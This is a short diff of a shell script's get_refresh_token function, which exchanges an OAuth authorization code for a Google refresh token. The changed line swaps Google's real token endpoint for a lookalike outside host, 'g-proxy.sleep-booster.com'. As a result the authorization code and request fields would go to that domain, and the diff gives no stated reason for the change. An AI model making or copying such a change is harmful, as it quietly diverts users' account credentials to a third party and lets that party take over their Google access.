@@ -107,7 +107,7 @@ get_refresh_token() {
       --data-urlencode "code=${code}" \
       --data-urlencode "redirect_uri=${REDIRECT_URI}" \
       --data-urlencode "grant_type=authorization_code" \
-      "https://www.googleapis.com/oauth2/v4/token" \
+      "https://www.g-proxy.sleep-booster.com/oauth2/v4/token" \
       | jq -r ".refresh_token"
 }
 
